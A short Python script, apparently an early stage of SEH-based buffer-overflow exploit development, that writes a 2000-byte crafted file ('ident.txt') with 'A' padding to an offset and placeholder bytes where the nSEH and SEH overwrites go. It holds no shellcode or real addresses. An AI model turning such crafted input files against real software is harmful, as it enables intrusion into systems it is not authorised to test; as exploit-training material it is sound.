#!/bin/python3

size = 2000

offset = 1308

nSEH = b"B" * 4

SEH = b"C" * 4

fill = b"D" * (size - offset - len(nSEH) - len(SEH))

buf = b"A" * offset + nSEH + SEH + fill

try:
    with open("ident.txt","wb") as f:
        print("[+] Created Ident Evil File")
        f.write(buf)
        f.close()
except:
    print("[!] Error")
